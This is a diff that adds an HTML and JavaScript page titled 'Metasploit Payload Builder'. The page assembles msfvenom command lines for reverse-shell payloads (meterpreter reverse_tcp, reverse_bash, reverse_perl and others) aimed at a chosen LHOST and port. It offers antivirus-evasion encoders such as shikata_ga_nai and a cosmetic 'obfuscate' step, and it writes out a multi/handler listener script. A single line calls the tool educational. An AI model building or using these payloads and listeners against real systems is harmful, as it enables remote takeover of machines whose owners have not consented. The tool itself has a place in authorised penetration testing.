@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Metasploit Payload Builder</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000;
+      color: #c58b00;
+      overflow-x: hidden;
+    }
+    video#bg-video {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      min-width: 100vw; min-height: 100vh;
+      object-fit: cover;
+      z-index: -2;
+      opacity: 0.25;
+    }
+    audio#bg-music {
+      position: fixed;
+      z-index: -1;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .container {
+      max-width: 900px;
+      margin: 50px auto;
+      padding: 25px;
+      border-radius: 12px;
+      background: rgba(0, 0, 0, 0.2);
+    }
+    h1, label {
+      color: #c58b00;
+      text-shadow: 1px 1px 3px black;
+    }
+    input[type="text"], textarea, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: rgba(0, 0, 0, 0.3);
+      color: #c58b00;
+      border: 1px solid #c58b00;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    button {
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid #c58b00;
+      color: #c58b00;
+      padding: 10px 15px;
+      margin: 5px 5px 15px 0;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: red;
+    }
+    pre {
+      white-space: pre-wrap;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border: 1px solid red;
+      color: #00ffcc;
+      margin: 10px 0;
+      border-radius: 5px;
+      max-height: 340px;
+      overflow-y: auto;
+    }
+    .history { margin-top: 20px; }
+    .history-item {
+      border-bottom: 1px solid red;
+      padding: 5px;
+      font-size: 0.9rem;
+      color: #ff8800;
+    }
+    .hint { font-size: 0.88rem; opacity: 0.9; color: #ffb74d; }
+    @media (max-width: 768px) {
+      .container { margin: 20px 10px; padding: 15px; }
+      .row { grid-template-columns: 1fr; }
+      button { width: 100%; margin: 8px 0; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="background/1761817527453041720p.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+  <!-- Background Music -->
+  <audio id="bg-music" loop>
+    <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg" />
+    Your browser does not support the audio tag.
+  </audio>
+  <div class="container">
+    <h1>🎯 Metasploit Payload Builder</h1>
+    <label>Payload Type:</label>
+    <select id="payload-type">
+      <option>windows/meterpreter/reverse_tcp</option>
+      <option>windows/meterpreter/reverse_http</option>
+      <option>windows/meterpreter/reverse_https</option>
+      <option>linux/x86/meterpreter/reverse_tcp</option>
+      <option>linux/x64/meterpreter/reverse_tcp</option>
+      <option>osx/x86/meterpreter/reverse_tcp</option>
+      <option>android/meterpreter/reverse_tcp</option>
+      <option>java/meterpreter/reverse_tcp</option>
+      <option>python/meterpreter/reverse_tcp</option>
+      <option>cmd/unix/reverse_python</option>
+      <option>cmd/unix/reverse_bash</option>
+      <option>cmd/unix/reverse_perl</option>
+      <option>windows/x64/exec</option>
+      <option>linux/x86/exec</option>
+    </select>
+    <div class="row">
+      <div>
+        <label>Format:</label>
+        <select id="format">
+          <option>exe</option>
+          <option>raw</option>
+          <option>python</option>
+          <option>perl</option>
+          <option>bash</option>
+          <option>c</option>
+          <option>csharp</option>
+          <option>dll</option>
+          <option>elf</option>
+          <option>macho</option>
+          <option>java</option>
+          <option>psh</option>
+          <option>psh-net</option>
+          <option>vba</option>
+          <option>vbs</option>
+        </select>
+      </div>
+      <div>
+        <label>Architecture:</label>
+        <select id="arch">
+          <option>x86</option>
+          <option>x64</option>
+          <option>auto</option>
+        </select>
+      </div>
+    </div>
+    <div class="row">
+      <div>
+        <label>LHOST:</label>
+        <input type="text" id="lhost" placeholder="192.168.1.100" />
+      </div>
+      <div>
+        <label>LPORT:</label>
+        <input type="text" id="lport" placeholder="4444" value="4444" />
+      </div>
+    </div>
+    <label>Encoder:</label>
+    <select id="encoder">
+      <option>none</option>
+      <option>x86/shikata_ga_nai</option>
+      <option>x86/jmp_call_additive</option>
+      <option>x86/call4_dword_xor</option>
+      <option>x86/context_cpuid</option>
+      <option>x86/context_stat</option>
+      <option>x86/context_time</option>
+      <option>x86/fnstenv_mov</option>
+      <option>x86/nonalpha</option>
+      <option>x86/unicode_upper</option>
+      <option>x64/xor_dynamic</option>
+    </select>
+    <label>Iterations:</label>
+    <input type="text" id="iterations" placeholder="1" value="1" />
+    <label>Bad Characters:</label>
+    <textarea id="bad-chars" rows="2" placeholder='\x00\x0a\x0d'></textarea>
+    <label>Additional Options:</label>
+    <textarea id="options" rows="3" placeholder='e.g., EXITFUNC=thread, RHOSTS=192.168.1.0/24'></textarea>
+    <div class="row">
+      <button onclick="generatePayload()">Generate Payload</button>
+      <button onclick="generateHandler()">Generate Handler</button>
+    </div>
+    <div class="row">
+      <button onclick="encodePayload()">Apply Encoding</button>
+      <button onclick="obfuscatePayload()">Obfuscate</button>
+    </div>
+    <div class="row">
+      <button onclick="copyResult()">Copy Result</button>
+      <button onclick="clearAll()">Clear</button>
+    </div>
+    <div class="hint">Note: This tool generates Metasploit commands for educational purposes only. Use responsibly and only on systems you own or have permission to test.</div>
+    <label>Generated Command:</label>
+    <pre id="result-box">No payload generated yet...</pre>
+    <div class="history">
+      <h3>History</h3>
+      <div id="history-box"></div>
+    </div>
+  </div>
+  <script>
+    const music = document.getElementById("bg-music");
+    const resultBox = document.getElementById("result-box");
+    const historyBox = document.getElementById("history-box");
+    let history = [];
+    
+    window.addEventListener('click', () => {
+      music.play().catch(() => {});
+    }, { once: true });
+    
+    function generatePayload() {
+      const payloadType = document.getElementById("payload-type").value;
+      const format = document.getElementById("format").value;
+      const arch = document.getElementById("arch").value;
+      const lhost = document.getElementById("lhost").value.trim();
+      const lport = document.getElementById("lport").value.trim();
+      const encoder = document.getElementById("encoder").value;
+      const iterations = document.getElementById("iterations").value.trim();
+      const badChars = document.getElementById("bad-chars").value.trim();
+      const options = document.getElementById("options").value.trim();
+      
+      if (!lhost) {
+        resultBox.textContent = "❌ LHOST is required.";
+        return;
+      }
+      
+      if (!lport) {
+        resultBox.textContent = "❌ LPORT is required.";
+        return;
+      }
+      
+      let command = "msfvenom -p " + payloadType;
+      
+      // Add LHOST and LPORT
+      command += " LHOST=" + lhost + " LPORT=" + lport;
+      
+      // Add format
+      command += " -f " + format;
+      
+      // Add architecture if not auto
+      if (arch !== "auto") {
+        command += " -a " + arch;
+      }
+      
+      // Add encoder if not none
+      if (encoder !== "none") {
+        command += " -e " + encoder;
+        
+        // Add iterations if specified
+        if (iterations && parseInt(iterations) > 1) {
+          command += " -i " + iterations;
+        }
+      }
+      
+      // Add bad characters if specified
+      if (badChars) {
+        command += " -b '" + badChars + "'";
+      }
+      
+      // Add additional options if specified
+      if (options) {
+        command += " " + options;
+      }
+      
+      // Add output file if format is not a script
+      if (["exe", "dll", "elf", "macho"].includes(format)) {
+        const filename = "payload." + format;
+        command += " -o " + filename;
+      }
+      
+      resultBox.textContent = command;
+      logHistory(payloadType, `Generated for ${lhost}:${lport}`);
+    }
+    
+    function generateHandler() {
+      const payloadType = document.getElementById("payload-type").value;
+      const lhost = document.getElementById("lhost").value.trim();
+      const lport = document.getElementById("lport").value.trim();
+      
+      if (!lhost) {
+        resultBox.textContent = "❌ LHOST is required.";
+        return;
+      }
+      
+      if (!lport) {
+        resultBox.textContent = "❌ LPORT is required.";
+        return;
+      }
+      
+      const handler = `# Metasploit Handler for ${payloadType}
+use exploit/multi/handler
+set payload ${payloadType}
+set LHOST ${lhost}
+set LPORT ${lport}
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j -z`;
+      
+      resultBox.textContent = handler;
+      logHistory("Handler", `Generated for ${lhost}:${lport}`);
+    }
+    
+    function encodePayload() {
+      const command = resultBox.textContent;
+      if (!command || command === "No payload generated yet...") {
+        resultBox.textContent = "❌ No payload to encode. Generate payload first.";
+        return;
+      }
+      
+      const encoder = document.getElementById("encoder").value;
+      const iterations = document.getElementById("iterations").value.trim();
+      
+      if (encoder === "none") {
+        resultBox.textContent = "❌ Please select an encoder first.";
+        return;
+      }
+      
+      let encoded = command;
+      
+      // Check if command already has an encoder
+      if (!command.includes(" -e ")) {
+        encoded += " -e " + encoder;
+        
+        // Add iterations if specified
+        if (iterations && parseInt(iterations) > 1) {
+          encoded += " -i " + iterations;
+        }
+      } else {
+        // Replace existing encoder
+        encoded = command.replace(/ -e \S+/, " -e " + encoder);
+        
+        // Replace or add iterations
+        if (iterations && parseInt(iterations) > 1) {
+          if (command.includes(" -i ")) {
+            encoded = encoded.replace(/ -i \d+/, " -i " + iterations);
+          } else {
+            encoded += " -i " + iterations;
+          }
+        }
+      }
+      
+      resultBox.textContent = encoded;
+      logHistory("Encoding", `Applied ${encoder} encoder`);
+    }
+    
+    function obfuscatePayload() {
+      const command = resultBox.textContent;
+      if (!command || command === "No payload generated yet...") {
+        resultBox.textContent = "❌ No payload to obfuscate. Generate payload first.";
+        return;
+      }
+      
+      // Simple obfuscation by adding a comment with random characters
+      const randomChars = Math.random().toString(36).substring(2, 15);
+      const obfuscated = command + " # " + randomChars;
+      
+      resultBox.textContent = obfuscated;
+      logHistory("Obfuscation", "Applied random comment");
+    }
+    
+    function copyResult() {
+      const text = resultBox.textContent;
+      if (!text || text === "No payload generated yet...") return alert("Nothing to copy!");
+      navigator.clipboard.writeText(text).then(() => alert("Command copied!"));
+    }
+    
+    function clearAll() {
+      document.getElementById("payload-type").value = "windows/meterpreter/reverse_tcp";
+      document.getElementById("format").value = "exe";
+      document.getElementById("arch").value = "x86";
+      document.getElementById("lhost").value = "";
+      document.getElementById("lport").value = "4444";
+      document.getElementById("encoder").value = "none";
+      document.getElementById("iterations").value = "1";
+      document.getElementById("bad-chars").value = "";
+      document.getElementById("options").value = "";
+      resultBox.textContent = "No payload generated yet...";
+    }
+    
+    function logHistory(target, snippet) {
+      const time = new Date().toLocaleTimeString();
+      const line = `${time} - ${target}: ${snippet}`;
+      history.unshift(line);
+      updateHistory();
+    }
+    
+    function updateHistory() {
+      historyBox.innerHTML = "";
+      history.slice(0, 8).forEach(entry => {
+        const div = document.createElement("div");
+        div.className = "history-item";
+        div.textContent = entry;
+        historyBox.appendChild(div);
+      });
+    }
+  </script>
+</body>
+</html>
